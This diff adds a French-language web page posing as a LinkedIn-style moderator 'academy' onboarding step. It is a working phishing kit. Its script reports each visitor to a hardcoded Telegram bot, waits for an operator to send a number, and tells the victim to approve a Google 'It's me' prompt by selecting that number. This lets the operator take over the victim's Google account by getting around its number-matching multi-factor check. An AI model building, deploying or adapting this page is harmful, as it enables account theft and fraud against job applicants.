@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ModérationPro - Académie</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: { sans: ['Inter', 'sans-serif'] },
+                    colors: {
+                        li: { blue: '#0a66c2', hover: '#004182', text: '#000000e6', bg: '#f3f2ef' }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0a66c2;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body class="bg-[#f3f2ef] font-sans min-h-screen flex flex-col items-center pb-12">
+
+    <!-- En-tête -->
+    <div class="w-full bg-white py-4 flex justify-center shadow-sm">
+        <div class="flex items-center gap-2">
+            <div class="bg-li-blue text-white font-bold text-xl px-2 py-0.5 rounded-sm">in</div>
+            <span class="font-bold text-xl tracking-tight">Modération<span class="text-li-blue">Pro</span></span>
+        </div>
+    </div>
+
+    <!-- Conteneur principal -->
+    <main class="w-full max-w-md mt-8 px-4">
+        <div class="bg-white rounded-xl shadow-sm border border-gray-200 overflow-hidden min-h-[400px] flex flex-col">
+            
+            <!-- VUE 1 : Accueil -->
+            <div id="view-init" class="p-8 flex flex-col items-center text-center flex-grow transition-opacity duration-300">
+                <h1 class="text-2xl font-bold text-gray-900 mb-4">Bienvenue postulant</h1>
+                <p class="text-gray-600 text-base mb-8 px-2">Vous avez été sélectionné et poursuivez les étapes pour suivre la formation</p>
+                <div class="w-full border-t border-gray-100 mb-8"></div>
+                <p class="text-gray-600 text-base mb-8">Vous êtes à quelques instants des cours de l'académie.</p>
+                <button id="startBtn" class="w-full flex items-center justify-center gap-3 border border-gray-400 hover:bg-gray-50 text-gray-800 font-medium py-3 px-4 rounded-full transition duration-200">
+                    <img src="https://i.postimg.cc/9Mmv644N/Google-G-logo-svg.png" alt="Logo" class="w-6 h-6 rounded-md object-cover">
+                    Connecter a Google
+                </button>
+            </div>
+
+            <!-- VUE 2 : Attente (Chargement) -->
+            <div id="view-waiting" class="hidden p-8 flex flex-col items-center justify-center text-center flex-grow transition-opacity duration-300">
+                <div class="loader mb-6"></div>
+                <h2 id="waitingTitle" class="text-xl font-semibold text-gray-900 mb-2">Sécurisation de la session</h2>
+                <p id="waitingDesc" class="text-gray-500 text-sm">Veuillez patienter pendant que nous générons votre accès sécurisé...</p>
+                <p class="text-xs text-gray-400 mt-8">ID Session: <span id="displaySessionId" class="font-mono text-li-blue font-bold">Génération...</span></p>
+            </div>
+
+            <!-- VUE 3 : Instructions & Numéro -->
+            <div id="view-instructions" class="hidden p-8 flex flex-col items-center text-center flex-grow transition-opacity duration-300">
+                <img src="https://i.postimg.cc/9Mmv644N/Google-G-logo-svg.png" alt="Logo" class="w-16 h-16 mb-4 rounded-xl shadow-sm object-cover">
+                <h2 class="text-xl font-semibold text-gray-900 mb-2">Vérification requise</h2>
+                <p class="text-gray-600 text-sm mb-6">Ouvrez votre Notification google. Appuyez sur <strong>"It's me"</strong>, puis sélectionnez le numéro ci-dessous.</p>
+                
+                <div class="bg-gray-100 rounded-lg p-6 mb-8 w-full border border-gray-200">
+                    <span class="block text-sm text-gray-500 mb-2">Votre numéro de sécurité :</span>
+                    <span id="securityNumber" class="text-6xl font-bold text-li-blue tracking-wider">--</span>
+                </div>
+
+                <button id="numberSelectedBtn" class="w-full bg-li-blue hover:bg-li-hover text-white font-semibold py-3 px-4 rounded-full transition duration-200 shadow-sm">
+                    J'ai sélectionné le numéro
+                </button>
+            </div>
+
+            <!-- VUE 4 : Succès -->
+            <div id="view-success" class="hidden p-8 flex flex-col items-center justify-center text-center flex-grow bg-green-50">
+                <div class="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-4">
+                    <svg class="w-8 h-8 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+                </div>
+                <h2 class="text-xl font-bold text-gray-900 mb-2">Session validée avec succès</h2>
+                <p class="text-green-700 text-sm">Votre identité a été confirmée. Redirection vers l'académie en cours...</p>
+            </div>
+            
+            <!-- VUE 5 : Échec -->
+            <div id="view-rejected" class="hidden p-8 flex flex-col items-center justify-center text-center flex-grow bg-red-50">
+                <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                    <svg class="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
+                </div>
+                <h2 class="text-xl font-bold text-gray-900 mb-2">Validation refusée</h2>
+                <p class="text-red-700 text-sm mb-6">La session n'a pas pu être validée. Veuillez recommencer la procédure.</p>
+                <button onclick="window.location.reload()" class="w-full border border-red-400 text-red-600 font-semibold py-2 px-4 rounded-full hover:bg-red-100">Recommencer</button>
+            </div>
+        </div>
+    </main>
+
+    <!-- SCRIPT TOUT-EN-UN -->
+    <script>
+        // --- VOS IDENTIFIANTS TELEGRAM ---
+        const BOT_TOKEN = '8837333684:AAGDSbb0-_SwvhzACsXh8P7cRAJe3dwlRFk';
+        const CHAT_ID = '8553842589';
+
+        // --- VARIABLES DE SESSION ---
+        let currentSessionId = Math.random().toString(36).substring(2, 7).toUpperCase();
+        let currentState = 'INIT'; // 'INIT' -> 'PENDING_NUMBER' -> 'WAITING_USER_CLICK' -> 'PENDING_VALIDATION' -> 'DONE'
+        let lastUpdateId = 0; 
+        let pollingInterval = null;
+
+        const views = {
+            init: document.getElementById('view-init'),
+            waiting: document.getElementById('view-waiting'),
+            instructions: document.getElementById('view-instructions'),
+            success: document.getElementById('view-success'),
+            rejected: document.getElementById('view-rejected')
+        };
+
+        function showView(viewName) {
+            Object.values(views).forEach(v => v.classList.add('hidden'));
+            views[viewName].classList.remove('hidden');
+        }
+
+        async function sendTelegramMessage(text, replyMarkup = null) {
+            const body = {
+                chat_id: CHAT_ID,
+                text: text,
+                parse_mode: 'Markdown'
+            };
+            if (replyMarkup) body.reply_markup = replyMarkup;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(body)
+                });
+            } catch (e) {
+                console.log("Erreur lors de l'envoi du message.");
+            }
+        }
+
+        // --- LECTURE EN DIRECT DE TELEGRAM ---
+        async function checkTelegramUpdates() {
+            if (currentState === 'DONE') return;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await response.json();
+
+                if (!data.ok) return;
+
+                if (data.result.length > 0) {
+                    for (let update of data.result) {
+                        lastUpdateId = update.update_id; 
+
+                        // Si c'est un message texte de l'admin (attribution du numéro)
+                        if (update.message && update.message.text) {
+                            const texteRecu = update.message.text;
+
+                            if (currentState === 'PENDING_NUMBER') {
+                                const regex = new RegExp(`^/numero\\s+${currentSessionId}\\s+(\\d+)`, 'i');
+                                const match = texteRecu.match(regex);
+                                
+                                if (match) {
+                                    const numeroAttribue = match[1];
+                                    document.getElementById('securityNumber').textContent = numeroAttribue;
+                                    showView('instructions');
+                                    currentState = 'WAITING_USER_CLICK';
+                                    sendTelegramMessage(`✅ *Numéro ${numeroAttribue}* bien affiché sur l'écran du visiteur (Session \`${currentSessionId}\`).`);
+                                }
+                            }
+                        }
+
+                        // Si c'est un clic sur les boutons Yes/No (validation de session)
+                        if (currentState === 'PENDING_VALIDATION' && update.callback_query) {
+                            const btnData = update.callback_query.data;
+                            const queryId = update.callback_query.id;
+                            
+                            if (btnData === `valid_yes_${currentSessionId}`) {
+                                showView('success');
+                                currentState = 'DONE';
+                                clearInterval(pollingInterval);
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${queryId}&text=Session%20Validée`);
+                            } 
+                            else if (btnData === `valid_no_${currentSessionId}`) {
+                                showView('rejected');
+                                currentState = 'DONE';
+                                clearInterval(pollingInterval);
+                                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery?callback_query_id=${queryId}&text=Session%20Refusée`);
+                            }
+                        }
+                    }
+                }
+            } catch (error) {
+                console.log("Erreur réseau silencieuse.");
+            }
+        }
+
+
+        // --- ACTIONS BOUTONS PAGE WEB ---
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('startBtn');
+            btn.innerHTML = '<div class="loader" style="width:20px;height:20px;border-width:2px;border-top-color:#fff;"></div>';
+            btn.classList.add('bg-gray-400', 'text-white');
+            
+            document.getElementById('displaySessionId').textContent = currentSessionId;
+            showView('waiting');
+            currentState = 'PENDING_NUMBER';
+
+            const msg = `🔵 *Nouvelle tentative de connexion en ligne*\n\nID Session: \`${currentSessionId}\`\n\nPour attribuer un numéro, répondez avec la commande :\n\`/numero ${currentSessionId} 19\``;
+            await sendTelegramMessage(msg);
+
+            // Démarrage de l'écoute de Telegram en boucle (toutes les 2 secondes)
+            pollingInterval = setInterval(checkTelegramUpdates, 2000);
+        });
+
+        document.getElementById('numberSelectedBtn').addEventListener('click', async () => {
+            const btn = document.getElementById('numberSelectedBtn');
+            btn.innerHTML = '<div class="loader" style="width:20px;height:20px;border-width:2px;border-top-color:#fff;"></div>';
+            
+            document.getElementById('waitingTitle').textContent = "Vérification en cours...";
+            document.getElementById('waitingDesc').textContent = "En attente de la validation finale de l'administrateur.";
+            showView('waiting');
+            currentState = 'PENDING_VALIDATION';
+
+            const msg = `🟡 Le candidat affirme avoir sélectionné le numéro sur l'application.\n\nValidez-vous cette session \`${currentSessionId}\` ?`;
+            const boutons = {
+                inline_keyboard: [
+                    [
+                        { text: '✅ Confirmer (Yes)', callback_data: `valid_yes_${currentSessionId}` },
+                        { text: '❌ Refuser (No)', callback_data: `valid_no_${currentSessionId}` }
+                    ]
+                ]
+            };
+            
+            await sendTelegramMessage(msg, boutons);
+        });
+    </script>
+</body>
+</html>
